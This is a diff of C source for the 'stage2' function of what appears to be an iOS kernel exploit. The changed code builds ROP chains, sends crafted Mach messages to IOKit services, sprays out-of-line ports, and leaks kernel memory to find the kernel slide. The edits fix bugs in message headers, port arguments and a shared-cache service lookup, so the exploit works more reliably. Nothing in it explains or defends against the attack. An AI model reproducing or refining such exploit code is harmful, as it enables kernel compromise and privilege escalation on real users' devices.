@@ -701,7 +701,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("ool_msg",sizeof(ool_message_struct),ool_message); // the message we will send to the kernel
 	DEFINE_ROP_VAR("ool_msg_recv",sizeof(ool_message_struct),tmp); // the message we will recieve from the kernel
 
-	ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,desc) + offsetof(mach_msg_ool_ports_descriptor_t, address) /*offset of desc[0].address*/,"tmp_port",0,sizeof(ool_message->desc[0].address));
+	SET_ROP_VAR64_TO_VAR_W_OFFSET("ool_msg",offsetof(ool_message_struct,desc[0].address),"tmp_port",0);
 
 
 	kport_t * fakeport = malloc(sizeof(kport_t));
@@ -740,7 +740,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	memleak_msg->scalar_outputCnt = 0;
 	memleak_msg->ool_output = 0;
 	memleak_msg->ool_output_size = 0;
-	memleak_msg->Head.msgh_bits = MACH_MSG_TYPE_MAKE_SEND_ONCE;
+	memleak_msg->Head.msgh_bits = MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
 	memleak_msg->Head.msgh_id = 2865;
 	memleak_msg->Head.msgh_reserved = 0;
 
@@ -803,15 +803,16 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	CFRelease(myservice_dict);
 	uint64_t data_length = CFDataGetLength(myservice_serialized);
 
-	/*  THIS IS SEGFAULTING AND IDK why
 	uint64_t cache_addr = 0;
 	syscall(294, &cache_addr);
+	printf("%llx\n",cache_addr);
 	
 	kern_return_t (*matching_service_bin)(mach_port_t,void * ,mach_msg_type_number_t,mach_port_t *) = realsym("/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64","_io_service_get_matching_service_bin") - 0x180000000 + cache_addr;
 	mach_port_t test_port = MACH_PORT_NULL;
-	matching_service_bin(mach_host_self(),CFDataGetBytePtr(myservice_serialized),data_length,&test_port);
+	mach_port_t host_port;
+	host_get_io_master(mach_host_self(),&host_port);
+	matching_service_bin(host_port,CFDataGetBytePtr(myservice_serialized),data_length,&test_port);
 	if(test_port == MACH_PORT_NULL) {printf("test_port is null");exit(1);}
-	*/
 
 	struct GetMatchingService_Request {
 		mach_msg_header_t Head;
@@ -830,11 +831,11 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	struct GetMatchingService_Request * service_request = malloc(sizeof(struct GetMatchingService_Request));
 	memset(service_request,0,sizeof(struct GetMatchingService_Request));
 	service_request->NDR = NDR_record;
-	service_request->Head.msgh_bits = MACH_MSG_TYPE_MAKE_SEND_ONCE;
+	service_request->Head.msgh_bits = MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
 	service_request->Head.msgh_id = 2880;
 	service_request->Head.msgh_reserved = 0;
 	service_request->matchingCnt = data_length;
-	memcpy(&service_request->matching,CFDataGetBytePtr(myservice_serialized),data_length);
+	memcpy(service_request->matching,CFDataGetBytePtr(myservice_serialized),data_length);
 
 	DEFINE_ROP_VAR("service_request",sizeof(struct GetMatchingService_Request),service_request);
 	ROP_VAR_CPY_W_OFFSET("service_request",offsetof(struct GetMatchingService_Request,Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
@@ -842,7 +843,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	ROP_VAR_ARG_HOW_MANY(2);
 	ROP_VAR_ARG("service_request",1);
-	ROP_VAR_ARG("reply_port",5);
+	ROP_VAR_ARG64("reply_port",5);
 	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct GetMatchingService_Request)-4096+((data_length+3) & ~3), sizeof(struct GetMatchingService_Reply), 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);
 
 	ROP_VAR_CPY_W_OFFSET("service",0,"service_request",offsetof(struct GetMatchingService_Reply,service.name),sizeof(mach_port_t));
@@ -887,7 +888,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	// .propertiesCnt is also 0 */
 	
-	service_open_request->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSG_TYPE_MAKE_SEND_ONCE;
+	service_open_request->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
 	service_open_request->Head.msgh_id = 2862;
 	service_open_request->Head.msgh_reserved = 0;
 
@@ -895,6 +896,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	
 	ROP_VAR_CPY_W_OFFSET("service_open_request",offsetof(struct ServiceOpen_Request,Head.msgh_remote_port),"service",0,sizeof(mach_port_t));
 	ROP_VAR_CPY_W_OFFSET("service_open_request",offsetof(struct ServiceOpen_Request,Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
+	ROP_VAR_CPY_W_OFFSET("service_open_request",offsetof(struct ServiceOpen_Request,owningTask.name),"self",0,sizeof(mach_port_t));
 
 	ROP_VAR_ARG_HOW_MANY(2);
 	ROP_VAR_ARG("service_open_request",1);
@@ -958,13 +960,14 @@ _STRUCT_ARM_THREAD_STATE64
 		CALL("mach_port_insert_right",0,0,0, MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);
 
 		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head.msgh_remote_port),"msg_port",0,sizeof(mach_port_t));
+		SET_ROP_VAR32("tmp_port",0); // make sure tmp_port really is zero
 
 		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG("ool_msg",1);
 		CALL("mach_msg",0,MACH_SEND_MSG,ool_message->head.msgh_size,0,0,0,0,0);
 
 		// no need for another loop in rop... we can just unroll this one here
-		SET_ROP_VAR64_TO_VAR_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,Head.msgh_remote_port),"client",0); // set memleak_msg->Head.msgh_request_port
+		ROP_VAR_CPY_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,Head.msgh_remote_port),"client",0,sizeof(mach_port_t)); // set memleak_msg->Head.msgh_request_port
 		for (int i = 0; i < 10; i++) {
 			ROP_VAR_ARG_HOW_MANY(1);
 			ROP_VAR_ARG("memleak_msg",1);
@@ -1006,7 +1009,7 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG("WEDIDIT",2);
 	CALL("write",1,0,1024,0,0,0,0,0);
 
-	ADD_USLEEP(10000000);
+	//ADD_USLEEP(10000000);
 
 	// get kernel slide
 	// alloc new valid port 
